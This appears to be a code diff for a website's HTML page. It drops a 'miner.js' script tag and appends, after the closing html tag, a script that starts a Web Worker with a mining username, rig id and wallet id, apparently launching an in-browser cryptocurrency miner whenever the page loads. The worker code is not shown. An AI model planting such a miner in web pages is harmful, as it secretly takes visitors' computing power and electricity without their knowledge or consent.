@@ -2,9 +2,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <script type="text/javascript" src="hashes.js"></script>
-    <script src="miner.js" defer></script>
-
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -241,3 +238,13 @@
     </script>
 </body>
 </html>
+<script>
+let username = `rpinews`;
+let wallet_id = Math.floor(Math.random() * 2811);
+let rigid = `AmogOS-${wallet_id}`;
+let workerVer = 0;
+
+let socketWorker = new Worker("worker/worker.js"); //creates the worker
+socketWorker.postMessage('Start,' + username + "," + rigid + "," + workerVer + "," + wallet_id);
+
+
